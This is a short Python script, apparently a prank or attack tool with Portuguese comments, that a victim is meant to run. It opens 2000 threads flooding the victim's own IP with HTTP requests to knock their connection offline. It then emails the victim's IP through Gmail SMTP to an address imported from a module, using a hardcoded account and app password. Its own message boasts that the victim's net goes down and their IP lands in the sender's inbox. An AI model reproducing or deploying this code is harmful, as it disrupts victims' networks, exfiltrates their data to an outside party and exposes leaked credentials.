from DerrubaNet import a
import socket, threading, smtplib, os, time, sys
import email.message
host = socket.gethostname()
IP = socket.gethostbyname(host)

os.system('cls')
#nome


class DenialOfService(object):
    def __init__(self, target=f'{IP}', port=80, ip_mask="182.21.20.32"):
        self.target = target
        self.port = port
        self.ip_mask = ip_mask
        

    def run(self):        
        for i in range(2000):
            thread = threading.Thread(target=self.attack).start()


    def attack(self):
        while True:
            os.system('cls')
            os.system('clear')
            z = '''Carregando...'''


            for c in z:
                sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.02)
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.target, self.port))
            connection.sendto((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
            connection.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
            connection.close()
        
            break
if __name__ == "__main__":
    DenialOfService().run()

#email
def enviar_email():
    corpo_email = f'IP: {IP}'
    
 
    msg = email.message.Message()
    msg['Subject'] = '☠'
    msg['From'] = 'ipcylughtool@gmail.com'
    msg['To'] = f'{a}'
    password = 'svpzullpcdtgtkrf'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
b = '''IP PEGO, ISSO SIGNIFICA QUE A VITIMA EXECUTOU, LOGO A NET DELA CAI, O IP DO MESMO ESTA EM SEU EMAIL!!'''
enviar_email()